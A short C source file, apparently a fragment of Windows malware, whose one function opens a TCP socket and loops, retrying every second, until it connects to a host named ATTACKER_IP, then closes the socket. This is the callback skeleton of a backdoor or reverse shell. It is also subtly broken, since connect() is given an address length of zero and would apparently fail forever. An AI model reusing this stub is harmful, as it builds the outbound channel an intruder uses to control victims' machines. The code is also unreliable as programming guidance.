#include"main.h"

void startfunction() 
{

	SOCKET ssock;
	SOCKADDR_IN saddr = { 0, };


	ssock = socket(AF_INET, SOCK_STREAM, 0);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(CONNECTING_LIST);

	while (connect(ssock, (LPSOCKADDR)&saddr, 0) == SOCKET_ERROR)
		Sleep(1000);


	closesocket(ssock);

	

}